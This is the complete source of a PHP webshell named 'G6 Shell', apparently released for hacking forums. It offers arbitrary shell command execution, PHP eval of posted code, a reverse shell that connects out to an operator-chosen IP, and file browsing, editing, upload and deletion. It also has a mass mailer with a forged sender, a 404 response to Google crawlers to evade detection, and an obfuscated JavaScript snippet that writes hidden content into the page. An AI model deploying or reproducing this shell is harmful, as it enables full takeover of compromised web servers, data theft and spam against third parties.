<!DOCTYPE html>
<html>
<!--
	Version: 1.1 Beta

	G6 PHP webshell was coded by Mr. P-teo for the Hacking community.
	G6 offers the following features:
		- File Browsing
		- File Editing
		- File Upload
		- Self Remove
		- PHP code execution
		- Server Information
		- Password Hash Identifier
		- Terminal
		- Remote Back Connect
		- Mass Mail
	
	Mass error with filemanager, will re-write at the week end. 

-->	
<style stype="text/css">
.flink{font-weight:normal;}
body{background-color:#101010;	background:#101010;color:#f2f2f2;font-family:tahoma;font-size:12px;}
body a{	color:#3467BA;font-weight:bold;text-decoration:none;}
body a:hover{text-decoration:underline;}
#main_content{border:1px solid #5C7296;overflow:hidden;width:1000px;height:auto;padding:15px;margin: 0 auto;background:#0A0A0A;border-radius:6px;-moz-border-radius:6px;-webkit-border-radius:6px;}
.enabled{color:#7ACC29;}
.enabled a{color:#7ACC29;font-weight:normal;}
.disabled{color:#CC0000;}
.execbox{width:250px;padding: 5px 15px 15px 15px;height:auto;border:solid 1px #47A3FF;background:#0A0A0A;}
.viewsource{border:solid 1px #47A3FF;background:#0A0A0A;color:#f2f2f2;}
.command{width:620px;border:solid 1px #47A3FF;outline:none;background:#0A0A0A;color:#f2f2f2;}
.response{width:616px;color:green;height:300px;border-bottom:solid 1px #47A3FF;border-right:solid 1px #47A3FF;border-left:solid 1px #47A3FF;border-top:0;outline:none;background:#0A0A0A;color:#f2f2f2;margin:-4px 0px 0px 0px;}
.TableHeader_Name{width:450px;padding:0px 0px 0px 5px;height:25px;font-weight:bold;font-family:verdana;background-color:#282828;border-top-left-radius:4px;-moz-border-top-left-radius:4px;-webkit-border-top-left-radius:4px;}
.TableHeader{width:100px;height:25px;font-weight:bold;font-family:verdana;text-align:center;background-color:#282828;}
.TableHeaderoptions{padding:0px 0px 0px 15px;width:170px;height:25px;font-weight:bold;font-family:verdana;background-color:#282828;border-top-right-radius:4px;-moz-border-top-right-radius:4px;-webkit-border-top-right-radius:4px;}
.filesize{color:green;text-align:center;}
.filenames a{font-weight:normal;text-decoration:none;}
.filenames a:hover{text-decoration:underline;}
tr{background-color: #080808;}
tr:hover{background-color:#282828;}
#options{font-weight:200;font-family:tahoma;margin-left:10px;display:block;}
#title{font-size:25px;font-weight:bold;font-family:arial;display:block;padding:15px 0px 0px 0px;}
.Logo{font-size:150px;text-align:center;color:#101010;}
.logotext{font-size:20px;text-align:center;color:#101010;}
.terminaltop{background-color:#686868;margin:-10px 0px -3px 0px;width:622px;height:20px;border-top-right-radius:5px;-moz-border-top-right-radius:5px;-webkit-border-top-right-radius:5px;border-top-left-radius:5px;-moz-border-top-left-radius:5px;-webkit-border-top-left-radius:5px;}
.TableHeaderoptions2{padding:0px 0px 0px 15px;width:170px;height:25px;font-weight:bold;font-family:verdana;background-color:#282828;border-top-right-radius:4px;-moz-border-top-right-radius:4px;-webkit-border-top-right-radius:4px;}
.box{padding:10px;background-color:#292929;border:1px solid #3467BA;height:auto;width:970;border-radius:6px;-moz-border-radius:6px;-webkit-border-radius:6px;}
.box2{padding:5px;background-color:#000000;height:auto;width:970;border-radius:6px;-moz-border-radius:6px;-webkit-border-radius:6px;}
.optionstr td{background-color:#0A0A0A;}
.optionstr td:hover{background-color:#0A0A0A;}
.chdir{background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;}
.godir{margin:0px 10px 0px -5px;background-color:#292929;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;width:24px;border-top-right-radius:4px;-moz-border-top-right-radius:4px;-webkit-border-top-right-radius:4px;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;}
</style>
<body>
	<div id="main_content">
<?php
ob_start();
ini_set('display_errors', false);
ini_set('memory_limit', '-1');

if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; } 

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
echo "<title>G6 Shell v1.1 - Private .::Made By Mr. P-teo::.</title>
<script type="text/javascript" language="javascript">
<!--
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
";

function get_srv_info(){

	echo "<br /><span id='title'>G6 Shell v1.1 - Private</span><br /><div class='box'><b>Server Name: </b>".$_SERVER["SERVER_NAME"]."<br />
	<b>Server IP: </b>".$_SERVER["SERVER_ADDR"]." <span class='enabled'><a href='http://www.who.is/whois/".$_SERVER['HTTP_HOST']."' target='_blank'>[WHOIS]</a> - <a href='http://www.dnsstuff.com/tools?runFromMain=".$_SERVER["SERVER_ADDR"]."&toolType=traceroute' target='_blank'>[TRACEROUTE]</a></span><br />".
	"<b>Shell Location: </b>".$_SERVER["SCRIPT_FILENAME"]."<br />
	<b>Server Software: </b>".$_SERVER["SERVER_SOFTWARE"]." <span class='enabled'><a href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".$_SERVER['SERVER_SOFTWARE']."&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=' target='_blank'>[Exploit DB]</a></span><br />
	</div><br /><br /><p></p>";
}

function cmd(){
	$disabled = explode(', ', ini_get('disable_functions'));
	$diabledLower = array();
	foreach($diabled as $function){$diabledLower[] = strtolower($function);}
	if(!in_array($diabledLower, "exec")){return "exec";	}elseif(!in_array($diabledLower, "passthru")){return "passthru";}elseif(!in_array($diabledLower, "system")){return "system";}else{return "none";}}
	$shellVersion = "1.1";

$upload = $_GET['dXBsb2Fk'];
$downloadfilename = $_GET['ZG93bg'];
$delete = $_GET['delete'];
$file_explorer = $_GET['ZmlsZV9leHBsb3Jlcg'];
$mkdir = $_GET['bWtkaXI'];
$currentDirectoryFileDl = $_GET['downlfile'];
$NavLinks = array(
	array(
		"name" => "Main",
		"url" => "?"
	),
	array(
		"name" => "Server Information",
		"url" => "?c3J2aW5mbw="
	),
	array(
		"name" => "File Explorer",
		"url" => "?ZmlsZV9leHBsb3Jlcg=".dirname(__FILE__)."/"
	),
	array(
		"name" => "Terminal",
		"url" => "?dGVybWlhbmw"
	),
	array(
		"name" => "Hash Identifier",
		"url" => "?aGk="
	),
	array(
		"name" => "PHP Exec",
		"url" => "?eval"
	),
	array(
		"name" => "Back Connect",
		"url" => "?YmNrbmV0="
	),
	array(
		"name" => "Mass Mailer",
		"url" => "?kueqymass"
	),
	array(
		"name" => "Shell-101",
		"url" => "?a253aXN1ZQ"
	),
	array(
		"name" => "Self Remove",
		"url" => "?srmve"
	)
);
$CurrentUrl = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$last = count($NavLinks) - 1;
foreach($NavLinks as $NavLink => $NavRow){
	$linknames = ($NavLink == 0);
    $linkurls = ($NavLink == $last);
	echo '<a href="'.$NavRow['url'].'">'.$NavRow['name'].'</a> / ';
}
if(strstr($CurrentUrl, "readfile")){
		$sourcefile = $_REQUEST['readfile'];
   		if(is_file($sourcefile)){
        get_srv_info();
        if(isset($sourcefile))
        {
            $Finalsource = file_get_contents($sourcefile);		

		echo "<strong>Editing: </strong>".$sourcefile."<br /><br /><a href='".$_SERVER['HTTP_REFERER']."'>&laquo; Back to files</a><br /><form action='' method='POST'><textarea name='sourcecode' class='viewsource' rows='20' cols='121'>".htmlentities($Finalsource)."</textarea><br /><input type='Submit' value='Save File' name='save' /></form>";
		}
		}else{
			echo "Data not sent.";
		}
		if(isset($_POST['save'])){
			$new_source = $_POST['sourcecode'];
			$source_edit = fopen($sourcefile, 'w');
			fwrite($source_edit, $new_source);
			fclose($source_edit);
		}
}elseif(strstr($CurrentUrl, "aGk")){
	get_srv_info();
	echo "<p>G6 hash identifier is able to identify MD5, SHA-1, MySQL5, DES(Unix), SHA-256, SHA-384, SHA-512, MD5(Unix), MD5(APR), MD5(phpBB3), MD5(Wordpress), SHA-256(Unix), SHA-512(Unix) and MD5(Base-64).</p>";
	if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult == "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	?>
	<center>
		<form action="" method="POST"><table><tr class="optionstr"><td>Enter Hash:</td>	<td><input type="text" name="hash" class="command" /></td><td><input type="submit" name="gethash" value="Identify Hash" /></td></tr><tr class="optionstr"><td>Result: </td><td><?php echo $hashresult; ?></td></tr></table></form>
	</center>
	
	<?php

}elseif(strstr($CurrentUrl, "YmNrbmV0")){
	get_srv_info();
	echo '
<div id="back">
            <h2>Back Connect</h2>
            <p>Back connect will allow you to enter system commands remotely.</p>
            <p>
            <table>
				<form action="" method="post">
				<tr class="optionstr"><td>IP Address: </td><td><input type="textbox" name="ip" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				<tr class="optionstr"><td>Port: </td><td><input type="textbox" name="port" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				<tr class="optionstr"><td><input type="submit" name="bind" value="Open Connection" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				</form>
				</table>';
				if(isset($_POST['bind']))
					{
						echo "<p>Attempting Connection...</p>";
						$ip = $_POST['ip'];
						$port= $_POST['port'];
						$sockfd=fsockopen($ip , $port , $errno, $errstr );
						if($errno != 0){echo "<font color='red'><b>$errno</b> : $errstr</font>";}else if (!$sockfd)	{$result = "<p>Unexpected error has occured, connection may have failed.</p>";}	else {fputs ($sockfd ,"\n{################################################################}\n..:: G6 W3b Sh3ll v1.1- Coded By Mr. P-teo ::..\n\n=> Backconnect \n=> Back	\n
							 \n{################################################################}"); $pwd = shell_exec("pwd"); $sysinfo = shell_exec("uname -a"); $time = Shell_exec("time"); $len = 1337; fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n"); while(!feof($sockfd)){ $cmdPrompt = '[G6]#:> ';fputs ($sockfd , $cmdPrompt );$command= fgets($sockfd, $len);
							fputs($sockfd , "\n" . shell_exec($command) . "\n\n"); } fclose($sockfd);}}
		echo "</p></div>";

}elseif(strstr($CurrentUrl, "bWtmbA")){
	get_srv_info();
	echo "<p>If no file path is included it will be created within the same directory as the shell.</p><form action='' method='post'><p>Filename: <input type='text' name='newfilename' /></p><p><input type='submit' value='Create File' name='create' /></p></form>";
		$newfilename = htmlentities($_POST['newfilename']);
	if(isset($_POST['create'])){$ourFileName = $newfilename;$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");fclose($ourFileHandle);}
	echo "<br /><br />";
}elseif(strstr($CurrentUrl, "bWtkaXI")){
	get_srv_info();
	echo "<p>If no file path is included directory will be created within the same directory as the shell.</p>
		<form action='' method='post'>
		<p>Directory Name: <input type='text' name='newdirname' /></p>
		<p><input type='submit' value='Create New Directory' name='createdir' /></p>
		</form>";
	$newdirname = htmlentities($_POST['newdirname']);
	if(isset($_POST['createdir'])){
		$ourdirName = $newdirname;
		mkdir($ourdirName, 0777);
		echo "Directory Created!";
	}
	echo "
		<br /><br />";
}elseif(strstr($CurrentUrl, "ZmlsZV9leHBsb3Jlcg")){
		get_srv_info();
		$upload = $file_explorer;
		echo '<p><form action="" method="POST"><table><tr class="optionstr"><td><input class="chdir" type="text" name="chdir" value="'.$file_explorer.'"" /></td><td></td></form><td><div id="options"><a href="'.$CurrentUrl.'">Refresh Files</a></div></td><td><div id="options"><!--<a href="?bWtkaXI='.$file_explorer.'">Make Directory</a> | <a href="?bWtmbA='.$file_explorer.'">Make File</a> | <a href="?dXBsb2Fk='.$upload.'">Upload</a></div>--></td></tr>';
		if(isset($_POST['godir'])){$mandircha = $_POST['chdir'];if($mandircha){	header("Location: ?ZmlsZV9leHBsb3Jlcg=".$_POST['chdir']);}}
	?>
	</div></p>
			<table class="FileBrowserTable"><tr><td class="TableHeader_Name"> FileName's</td><td class="TableHeader">Filetype</a></td><td class="TableHeader">Size</td><td class="TableHeader">Permisions</td><td class="TableHeader">Last Modified</td><td class="TableHeaderoptions"> Options</td></tr>
		<?php

		$Shell_Directory = $_SERVER['REMOTE_DIR'];
			//load files...		

		function GetFileType($file){
			if(!is_dir($file)){
				if(strstr($file, ".")){
					$FileExt = end(explode(".", $file));
					return $FileExt;
				}else{
					return "Directory";
				}
			}else{
				$Directory = "Directory";
				return $Directory;
			}
		}

		


function GetFileSize($file){
	if(!is_dir($file))
		return round(filesize($file) / 1024, 2) . " Kb";
	else
		return "Not Availible";
}

function LastModified($file){
		return  "<center>".date("m/d/y", filemtime($file))."</center>";
}

function permissions($file){
	if(is_readable($file)){
		$readable = "r";
	}else{
		$readable = "?";
	}
	if(is_writable($file)){
		$writable = "w";
	}else{
		$writable = "?";
	}
	if(is_executable($file)){
		$executable = "x";
	}else{
		$executable = "?";
	}


if($readable."--".$writable."--".$executable == "r--w--x"){
	return "<center style='color:#f1f1f1;'>".$readable."--".$writable."--".$executable."</center>";
}else{
	return "<center>".$readable."--".$writable."--".$executable."</center>";
}
}

		$Files = scandir($file_explorer);
	foreach($Files as $File){
		if($File == ".."){
			$currentDirectory = $_GET['ZmlsZV9leHBsb3Jlcg'];
			//Up a directory
			$currentDirectory = substr($currentDirectory, 0, strrpos($currentDirectory, "/"));
			echo "<tr><td><a href='?ZmlsZV9leHBsb3Jlcg=" .$currentDirectory. "'>" . $File . "</a></td><td></td><td></td><td></td><td></td><td></td></tr>";

		}elseif($File == "."){
			//Same as current Dir, no need for this...

		}else{
			$currentDirectory = $_GET['ZmlsZV9leHBsb3Jlcg'];
			$type = GetFileType($currentDirectory. "/" .$File);
			if($type == "Directory"){
				echo "<tr><td><a class='flink' title='Explore Directory' href='?ZmlsZV9leHBsb3Jlcg=" .$currentDirectory. "/" .$File. "'>" . $File . "/</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td>Not Availible</td></tr>";
			}else{
				echo "<tr><td><a class='flink' title='Edit File' href='?readfile=" .$currentDirectory. "/" .$File. "'>" . $File . "</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td><a href='?readfile=" .$currentDirectory. "/" .$File. "' title='Edit File'>E</a> - <a href='?delete=" .$currentDirectory. "/" .$File. "' title='Bin the Document'>B</a> - <a href='?downlfile=".$currentDirectory. "/" .$File."&file=".$File."' title='Download File'>D</a></td></tr>";
			}
		}
	}
		
?>
</table>
<div style="background:#282828;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;border-bottom-left-radius:4px;-moz-border-bottom-left-radius:4px;-webkit-border-bottom-left-radius:4px;height:25px;margin:0px 0px 10px 0px;width:1000px;" ></div>
	<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
	<h4>File Upload</h4><form action="" method="post" enctype="multipart/form-data"><input type="file" name="file" /><br /><input type="submit" name="upload" value="Upload File" /></form></div>
	<?php
	if(isset($_POST['upload'])){if(isset($_FILES['file'])){	move_uploaded_file($_FILES["file"]["tmp_name"], $file_explorer."/". $_FILES["file"]["name"]);echo '<script>alert("File successfully uploaded, enjoy.");</script>';}	}
	?>
	<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
	<h4>Create Directory</h4>
	<form action="" method="post"><input type="text" name="dirname" /><br /><input type="submit" name="createdir" value="Create Dir" /></form></div>
	<?php
		if(isset($_POST['createdir'])){if(strlen($_POST['dirname']) > 0){mkdir($file_explorer."/".$_POST['dirname'], 777) or die($file_explorer."/".$_POST['dirname']);}}
	?>
		<br /><br /><br />
<?php

		
}elseif(strstr($CurrentUrl, "downlfile")){
			/*$type = mime_content_type($currentDirectoryFileDl);
			header('Content-Type: '.$type);
			header('Content-Disposition: attachment; filename="'.$currentDirectoryFileDl.'"');*/
			$file = $_GET['file'];
			// header('Content-Type: application/force-download'); Non-standard MIME-Type, incompatible with Samsung C3050 for example. Let it commented
			//readfile($currentDirectoryFileDl);
			forceDL($currentDirectoryFileDl, $file);
			/*
	 * forceDL
	 * 
	 * Forces the browser to download file
	 * 
	 * @param string $filePath Path to the selected download
	 * @param string $fileName Name of file to be saved, can be anything honestly
	 */
	function forceDL($filePath, $fileName) {
		/* Rquired for IE */
		if(ini_get('zlib.output_compression')) { ini_set('zlib.output_compression', 'Off');  }
		
		/*
		Files not downloading with correct headers?
		1) Open file in Notepad++ (or similar) and check for white-space or other code (php code)
		2) Extra code?
		3) Problem found.
		4) Profit
		Should answer most questions
		*/
		
		/* Headers */
		header('Pragma: public');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Last-Modified: ' . gmdate('D, d M Y H:i:s', filemtime($filePath)).' GMT');
		header('Cache-Control: private', false);
		header('Content-Type: application/force-download');
		header('Content-disposition: attachment; filename="' . $fileName . '"');
		header('Content-Transfer-Encoding: binary');
		header('Content-length: ' . filesize($filePath));
		readfile($filePath);
		echo $filePath.$fileName;
		exit();
	}

}elseif(strstr($CurrentUrl, "kueqymass")){
	get_srv_info();
	?>
		<strong>Mass Mailer</strong>
		<p>Be warned using the mass mailing feature may attract attention to your G6 shell. Seperate each email with <strong>;</strong></p>
		<form action="" method="post">
			<table><tr><td>To Email(s): </td><td><input type="text" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; width:220px;" name="email" placeholder="email@address.com" /></tr><tr><td>Subject: </td>	<td><input type="text" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px" name="subject" /></td></tr><tr><td>From Email: </td><td><input type="email" style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px;width:220px;" name="fromEmail" placeholder="example@google.com" /></td></tr><tr><td>Message: </td><td></td></tr></table><table><tr><td><textarea style="background-color:#010101;color:#f2f2f2;border:1px solid #3467BA;outline:none;font-size:11px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;padding:2px 3px;margin:0 0 0 -1px; height:200px;width:290px;" name="message"></textarea></td></tr><tr><td><input type="submit" name="send" value="Send Message(s)" /></td></tr></table></form>
			<?php
	if(isset($_POST['send'])){ $email = $_POST['email'];$subject = $_POST['subject'];$from = $_POST['fromEmail'];$message = $_POST['message'];if($email&&$subject&&$from&&$message){$emails = explode(";", $email);foreach($emails as $email){mail($email, $subject, $message, "From: ".$from);	}}}
}elseif(strstr($CurrentUrl, "delete")){
	if(!is_dir($delete)){unlink($delete);}else{rmdir($delete);}
		header("Location: ".$_SERVER['HTTP_REFERER']);
}elseif(strstr($CurrentUrl, "c3J2aW5mbw")){
	get_srv_info();
  $s_safemode = ini_get("safe_mode");
  if($s_safemode = TRUE){$s_safemode = "<span class='enabled'>[ON";}else{$s_safemode = "<span class='disabled'>[OFF"; }
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	echo "<b>Server Port: </b>".$_SERVER['SERVER_PORT']."<br /><br /><b>HTTP Connection: </b>".$_SERVER['HTTP_CONNECTION']."<br /><br /><b>Operating System:</b> ".php_uname()."<br /><br />";
	if(get_magic_quotes_gpc()){echo "<b>Magic Quotes:</b> <span class='enabled'>[ENABLED]</span><br /><br />";}else{echo "<b>Magic Quotes:</b> <span class='disabled'>[DISABLED]</span><br /><br />";}
	echo "<b>PHP Version:</b> ".phpversion()."<br /><br /><b>Safe Mode: </b>".$s_safemode."]</span><br /><br /><b>Curl: </b>".$curls."<br /><br /><b>Accept Encoding: </b> ".$_SERVER['HTTP_ACCEPT_ENCODING']."<br /><br /><b>Admin: </b>".$_SERVER['SERVER_ADMIN']."<br /><br /><strong>Disabled Functions: </strong>";
	if(!empty($disabled)){
	foreach($disabled as $functionsdis){
		echo $functionsdis.", ";
	}
	}else{
		echo "none";
	}
	echo "<br /><br /><strong>/etc/passwd: </strong>";
	if(is_readable("/home/etc/passwd")){
		echo "<span style='color:green;'>Readable</span>";
	}else{
		echo "<span style='color:red;'>Unreadable</span>";
	}
}elseif(strstr($CurrentUrl, "dGVybWlhbmw")){
	
	get_srv_info();
	?>
		<p>Command line execution via exec, passthru or system.</p>
		
		<form action="" method="post"><table><tr><td><b>Command Execution: </b></td><td><input type="text" placeholder="root~$ " autocomplete="off" name="command" class="command"/></td></tr></table>
	<?php
		$out = array();
		if(cmd()=="exec"){
			echo "Using: exec => ";
			exec($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}elseif (cmd()=="passthru") {	

			echo "Using: passthru => ";			
			passthru($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}elseif(cmd()=="system"){
			echo "Using: system => ";
			system($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}
}elseif(strstr($CurrentUrl, "a253aXN1ZQ")){
	get_srv_info();
	echo "
		<h4>Information</h4>
		<p>G6 Shell v".$shellVersion." Open Beta Edition - coded by Mr. P-teo, below are the known issues and bugs.</p>";

		?>
		<ul>
			<li>is_dir function not returning correct result within child dirs of the file browser.</li>
			<li>File Browser controls, e.g. rename, create file, delete full dir.</li>
			<li>Editing can run into trouble with GET Method Not Implemented error.</li>
		</ul>
		<br /><br />
	<?php
}elseif(strstr($CurrentUrl, "?eval")){
	get_srv_info();
	?>
	<div style="float:left;width:700px;">
	<h4>Eval (PHP code execution)</h4>
	<form action="" method="post">
		<textarea name="phpeval" style="width:700px;height:190px;padding:5px;background:#CCCCCC;">//Example, get all PHP info about the server 

echo phpinfo();</textarea><br />
		<input style="padding:4px 10px;margin:10px 0px;" name="evalexecute" value="Execute Code" type="submit"/>
	</form>
	</div>
	<div style="float:right;width:250px;">
		<h4>Information</h4>
		<p>Enter your specified php code within the textarea and wait for the response.</p>
		<p><strong>Example: </strong><i>echo phpinfo();</i></p><br /><br />
		<h4>Warning</h4>
		<p>including external files with seperate stylesheets may affect the apearence of G6 styles.</p>
	</div>
	<?php
		if(isset($_POST['evalexecute'])){
			eval($_POST['phpeval']);
		}
}elseif(strstr($CurrentUrl, "?srmve")){
		get_srv_info();
	?>
	<p>If you are sure you wish to remove the shell click the button below, make sure you are certain as you wil only have one shot at this.</p>
	<form action="" method="post">
		<center><input style="padding:7px 15px;margin:10px 0px;" name="Remove" value="Remove Shell" type="submit"/></center>
	</form>
	<?php
	if(isset($_POST['Remove'])){
		if(file_exists(__FILE__)){
			unlink(__FILE__);
		}
	}
}else{
	get_srv_info();

?>
	<br /><br /><br /><br /><div class='Logo'>G6 v<?php echo $shellVersion; ?></div><div class='logotext'>Private Shell Coded By Mr. P-teo</div><br /><br /><br />
	<?php
}
ob_flush();
?>
</div>
<body>
</html>